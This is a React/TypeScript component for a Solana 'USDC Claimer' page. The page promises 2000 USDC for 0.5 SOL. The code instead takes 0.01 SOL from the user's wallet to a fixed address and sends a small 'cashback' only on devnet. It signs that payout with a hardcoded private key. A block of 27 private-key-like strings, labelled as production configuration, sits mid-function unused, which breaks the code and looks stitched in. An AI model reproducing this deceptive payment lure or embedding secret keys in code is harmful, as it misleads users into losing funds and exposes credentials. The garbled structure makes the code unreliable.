/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5hYoX1bnX2CyTam64UXtBmSfAszwRX1msYuZnajXuiYTAH8v32YMQUnAJDc2j3u8GhMLgcs9opaG6aJvGxekK9cH"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "25LPTQW8vHEbYyqj1zkF68PRN2KwCVVXFpd6AabiYczDTcG6ASLRxGV8R2fnLCckX7LfQh3dQ1gaiUWMY4pzMr5F",
  "key1": "2x265u6M2a64F1kyDsai1VxuSqyHdxv3M13gpaCKLk4EiYkTMCAm6kcSnTQqa9SCCWEmoog7dgRCawyMAxM6Sm7C",
  "key2": "49ddAZiaUFriD9cfGcb6TaCKW4XdNSoTp49MKeuYBjRuwR6pBMKBHaJQ2djq2xB2m1aPYveP54BjHicF4Ab5cmza",
  "key3": "76SUPo9gCd1Wqrgy95hqHWZBhrWvdwR2JVZw3cR4jwMWzQxiWo6DiQVk6yyhhBGySjXTWQxPoSyVZCnQnFSVpMs",
  "key4": "tkFisZD9TTXpMFyAkS5NVK5gcG8yHkmAt2M5hnGa8jTFMzzg9NZb5xCLM8YfEbFtg77P6VX2GdJLjd8Mx8T3M6f",
  "key5": "rwiztXRMXmQTazweAQTZqRDKBd18y7Sbq7pkPPmk5Zjz65jWJnp7nstLhJffHaLP3tMgwv6hN7svKhMBNzTjTjQ",
  "key6": "4XxVcRdXjryaKeLG8hRZ4DJA3iZpEgR9nvWkEfqTRR9DNygxWQ1SWU3rAd5ZnHnudQp8UuE6UMAVDcMKgergHLGB",
  "key7": "3jBjfvyfUuXKajRivM4NQmSPZQsMaRZ77VCTU9h38cu5nLWj1uAi1cNsS5QpGyW2pkXQQMm32hcgcXmkAVLfcskX",
  "key8": "2G1b2uSmRk85BRgwZZV27AGsEesw9VUXHAHTgMo1ZmFUKueuHLNDQtLzBHHPgpdUiWimFUiMyQgbFQ9XTrSQY36J",
  "key9": "3gXc7UsC51VaBSgbrddPtePu2AGFzYPb12YENenMVCH7DSMs8LU9Zqtse2mPodVqqrMbYcs8R4ZQaUaGweHNY75q",
  "key10": "3Dw1YReFS3YGtBb6nxZvgpGo2vTRWwc3sLwrCHsXQADUnsnY7nUMmuyna9tqGtUX7b1puUajfbMgaxghuEX8weWb",
  "key11": "37fVR7jRNdPu2cf1CVqukHNSn9xYrTF4CHCVsVNmpSpuB2b9fsAvdTpcrceuRbjxmvPuGbvRacGkYuHb7Guuyk5e",
  "key12": "3qfundYkeaSUwFoyDg5ynhUXyPeVWX8P99sokoyGT52Haivfek6ouyt1TyWd8yNqHgEMc47AzoibNo8zynGJFmbD",
  "key13": "4oLAiuMJ8z1d24WBfHzpfd7psCjfoCtdFTuGzub52bUE3dpfTFMxYmL6o2vyKwyTBWZfxBjHKSog17hUj5u4H5RQ",
  "key14": "67UzoTYF8GXWuWAonwky96sX6Ciq6pnnmFAiUgHn15Kn282En9WUeoDYDQgARaJgsp5XC5UhqJJHLQieL11B7bUo",
  "key15": "3yx33HiEt6ExnZ22Mi78QgTkj2vxyk1BFsutK8uTkdJ5eQwUXk3tttKGPw9KKwm4dzXERT5P2tn1hMUy8UBm7gGH",
  "key16": "CczUDdeZuujA8ybXjVpGD4dC22gK91Z4dKuGzBuLMEPJWPcHLEchk8NdCKpC8pPtUmyDAckv9wQTpoLf38Hr1Xc",
  "key17": "4octLUs2S9QtmjCX4avGRazYH1iJrKgNeHxmjU9Lz48esHYRRc45b4B3cjAaDReRjLuprqMzPXioJKkF7KHKW6N5",
  "key18": "GuU4CjHiWhNodn8G7h3tdJLFKcWLHGRmyfWJv7r8JBUDcSvdY4MKccPoxUYyy9g3WfUHouNaCUWaJWJB1q6hmgs",
  "key19": "5dqZ3TmvFXcX1YEDrJRHZEJRPrBGpDF9GphYdPUt8cdUTaQw3YHk6ids6ieaocopvQ525Y9ScNcUiGVVg2u4qovt",
  "key20": "5N6eufidkuJ8QLPyidheXXGcAiZWAJDSwMZrXVZUtHZPuzFumYJbpCodCpKMyngKTPcYCaax6sg9idnLpxHzivy8",
  "key21": "4Q3FnTK7cyaQqrBQUEzkmXym8Sxt1ei7PToL99YswLz3J3hEWw4RKsatv79pKzc7pAufXzQkPE47voEqUGSAQw8H",
  "key22": "3cARJ8BWECGNJuZk69Vr7MdxUNUNTEQMcyuMYYm54qb1gAYZksLegdJpUQ7mxr28fH1ZEowWsqimZSYE1X3GcZUw",
  "key23": "2s2zSziREtxYqTVUkPYDfQ1zqTuSVZBpx3ifNmfdNrS4bmBN1ZgQUsExdLxE325ocFnUHUcHoK2JfG2TnUQZd1p9",
  "key24": "4aW3JuKrXFJ5TTcCPg5HnADqZqanmrfxf396yReG6B5AxfuJhtyxpFcdjbUxcokRRUoULkWfeDdVUWAUMUAHUjFS",
  "key25": "3FCopioDepQFSHVyNrPQxA92tB4U4BuuejfN8z3FxCxh9ridohb6Jq4Fdqx1ph5rUykCZ2cE4ndnYF9BhhWyAs8F",
  "key26": "3KrHB2iQ7E7cqvG8UMVJFpxToi1WusXaWjUp2wcUxwiAM1epfepQQeKETvH4jKdwysx69AELJSB3urwmGuLUzPSt"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
